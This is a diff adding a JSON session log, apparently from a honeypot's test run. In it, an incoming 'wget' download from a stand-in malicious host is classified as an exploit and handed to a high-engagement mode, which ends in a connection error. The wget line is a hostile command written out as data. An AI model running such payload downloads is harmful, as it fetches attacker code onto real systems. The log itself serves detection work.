@@ -1,0 +1,36 @@
+{
+  "session_id": "S-1762454985",
+  "src_ip": "127.0.0.1",
+  "src_port": 57182,
+  "events": [
+    {
+      "ts": 1762454985.0747156,
+      "text": "wget http://malicious.example/x\n"
+    },
+    {
+      "ts": 1762454985.118991,
+      "text": "[CLASS]=exploit|0.9|ENG=HIGH"
+    },
+    {
+      "ts": 1762454985.2408025,
+      "text": "[ACTION]=HANDOFF_TO_HIGH_ENGAGEMENT"
+    },
+    {
+      "ts": 1762454985.2606719,
+      "text": "[HIGH_ENGAGEMENT]=START"
+    },
+    {
+      "ts": 1762454986.0756032,
+      "text": "ATTACKER_CMD: ls -la"
+    },
+    {
+      "ts": 1762454986.786268,
+      "text": "[HIGH_ENGAGEMENT_ERROR]=[WinError 10053] An established connection was aborted by the software in your host machine"
+    },
+    {
+      "ts": 1762454986.8043828,
+      "text": "[HIGH_ENGAGEMENT]=END"
+    }
+  ],
+  "end_time": "Fri Nov  7 00:19:46 2025"
+}
